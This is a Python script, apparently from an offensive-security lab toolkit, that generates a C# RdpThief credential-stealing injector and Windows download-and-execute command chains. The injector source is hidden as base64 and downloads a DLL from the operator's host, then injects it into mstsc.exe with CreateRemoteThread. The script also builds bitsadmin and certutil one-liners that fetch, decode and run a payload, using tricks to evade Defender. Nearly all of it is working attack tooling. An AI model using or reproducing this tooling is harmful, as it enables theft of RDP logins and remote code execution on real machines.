import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunspace import certutil_b64encode

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"

devhost = "192.168.135.7"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writerdpthief(lhost):
    rdpthieffilename = "RdpThief.cs"
    binary = "rdpthief"
    rdpdllfilename = rand_word()

    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKdXNpbmcgU3lzdGVtLk5ldDsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpuYW1lc3BhY2UgQ29uc29sZUFwcERMTGkKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2Vzcyh1aW50IHByb2Nlc3NBY2Nlc3MsIGJvb2wgYkluaGVyaXRIYW5kbGUsIGludCBwcm9jZXNzSWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGxwQnVmZmVyLCBJbnQzMiBuU2l6ZSwgb3V0IEludFB0ciBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2ksIEV4YWN0U3BlbGxpbmcgPSB0cnVlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldE1vZHVsZUhhbmRsZShzdHJpbmcgbHBNb2R1bGVOYW1lKTsKCiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgLy9kb3dubG9hZCBkbGwKICAgICAgICAgICAgLy9TdHJpbmcgZGlyID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLk15RG9jdW1lbnRzKTsKICAgICAgICAgICAgU3RyaW5nIGRpciA9ICJjOlxcd2luZG93c1xcdGFza3MiOwogICAgICAgICAgICBXZWJDbGllbnQgd2MgPSBuZXcgV2ViQ2xpZW50KCk7CiAgICAgICAgICAgIElXZWJQcm94eSBkZWZhdWx0UHJveHkgPSBXZWJSZXF1ZXN0LkRlZmF1bHRXZWJQcm94eTsKICAgICAgICAgICAgaWYgKGRlZmF1bHRQcm94eSAhPSBudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB3Yy5Qcm94eSA9IGRlZmF1bHRQcm94eTsKICAgICAgICAgICAgfQ=="
    lower = "ICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgd2hpbGUodHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy9nZXQgdGFyZ2V0IHBpZAogICAgICAgICAgICAgICAgUHJvY2Vzc1tdIG1zdHNjUHJvYyA9IFByb2Nlc3MuR2V0UHJvY2Vzc2VzQnlOYW1lKCJtc3RzYyIpOwoKICAgICAgICAgICAgICAgIGlmIChtc3RzY1Byb2MuTGVuZ3RoID4gMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IG1zdHNjUHJvYy5MZW5ndGg7IGkrKykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGludCBwaWQgPSBtc3RzY1Byb2NbaV0uSWQ7CgogICAgICAgICAgICAgICAgICAgICAgICAvL29wZW4gYW5kIGFsbG9jYXRlIHJlYWRhYmxlIGFuZCB3cml0YWJsZSBtZW1vcnkgaW4gdGFyZ2V0IHBpZAogICAgICAgICAgICAgICAgICAgICAgICBJbnRQdHIgcEhhbmRsZSA9IE9wZW5Qcm9jZXNzKDB4MDAxRjBGRkYsIGZhbHNlLCBwaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBJbnRQdHIgYWRkciA9IFZpcnR1YWxBbGxvY0V4KHBIYW5kbGUsIEludFB0ci5aZXJvLCAweDEwMDAsIDB4MzAwMCwgMHg0MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vY29weSBwYXRoIGFuZCBuYW1lIG9mIGRsbCBpbnRvIGFsbG9jYXRlZCBtZW1vcnkKICAgICAgICAgICAgICAgICAgICAgICAgSW50UHRyIG91dFNpemU7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvb2xlYW4gcmVzID0gV3JpdGVQcm9jZXNzTWVtb3J5KHBIYW5kbGUsIGFkZHIsIEVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoZGxsTmFtZSksIGRsbE5hbWUuTGVuZ3RoLCBvdXQgb3V0U2l6ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vbG9jYXRlIGFkZHJlc3Mgb2YgTG9hZExpYnJhcnlBIGluIGN1cnJlbnQgcHJvY2VzcyAobGlrZWx5IHRvIGJlIHNhbWUgYXMgcmVtb3RlIHByb2Nlc3MpCiAgICAgICAgICAgICAgICAgICAgICAgIEludFB0ciBsb2FkTGliID0gR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJrZXJuZWwzMi5kbGwiKSwgIkxvYWRMaWJyYXJ5QSIpOwogICAgICAgICAgICAgICAgICAgICAgICAvL2ludm9rZSBMb2FkTGlicmFyeUEgKGxvYWRMaWIpIGluIHJlbW90ZSBwcm9jZXNzIChwSGFuZGxlKSB0byBydW4gZGxsIGNvcGllZCB0byB0aGUgYWxsb2NhdGVkIG1lbW9yeSAoYWRkcikKICAgICAgICAgICAgICAgICAgICAgICAgSW50UHRyIGhUaHJlYWQgPSBDcmVhdGVSZW1vdGVUaHJlYWQocEhhbmRsZSwgSW50UHRyLlplcm8sIDAsIGxvYWRMaWIsIGFkZHIsIDAsIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBUaHJlYWQuU2xlZXAoMTAwMCk7CiAgICAgICAgICAgIH0gICAgICAgICAgICAKICAgICAgICB9CiAgICB9Cn0="

    agent = "wc.Headers.Add (\"User-Agent\", \"%s\");" % agent_string

    if obfuscate_bin == "0":
        bindata = "String dllName = dir + \"\\\\%s.exe\";" % rdpdllfilename
        downdata = "wc.DownloadFile(\"http://%s/%s.exe\", dllName);" % (lhost,binary)
    if obfuscate_bin == "1":
        bindata = "String dllName = dir + \"\\\\%s.txt\";" % rdpdllfilename
        downdata = "wc.DownloadFile(\"http://%s/%s.txt\", dllName);" % (lhost,binary)

    with open(rdpthieffilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + agent + "\n")
        f.write("            " + bindata + "\n")
        f.write("            " + downdata + "\n")
        f.write(lower)
    f.close()

    print('[+] rdpthief cs written: %s' % rdpthieffilename)
    return rdpthieffilename
    pass

def makecombo_rdpthief(lhost,runfilename):
    exefilename = runfilename

    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randexename = "%s.exe" % rand_word()
    runwebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    utilpath = 'cmd /c %s'
    certutilcombo = "bitsadmin /Transfer myJob http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy networkservice AUTODETECT && " + certutilcombo_sub

    certfilename = certutil_b64encode(runwebroot+exefilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    runfileroot = runwebroot + runfilename
    runfilepath_met = loadpath_met % randexename #runfilename
    runfilepath_cmd = loadpath_cmd % randexename #runfilename

    combo_one = certutilcombo % (lhost,certfilename,certfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    combo_two = utilpath % (runfilepath_cmd)
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,runwebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (runfileroot,runfilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s' % (runfilepath_cmd))
    print('[*] use (only with admin privileges!):\n%s ' % (combo_two))
    print('[!] c-c-c-combo breaker (cmd only!) (only with admin privileges!) (sub):\n%s' % combo_break_sub)
    
    return combo_break,combo_break_sub
    pass

def makerdpthief(bitness,lhost):
    rdpthieffilename = writerdpthief(lhost)
    csfilepath = "/home/kali/data/ConsoleAppDLLi/ConsoleAppDLLi/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "ConsoleAppDLLi.exe"

    copy(rdpthieffilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)

    makecombo_rdpthief(lhost,exefilename)
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host

    makerdpthief(bitness,lhost)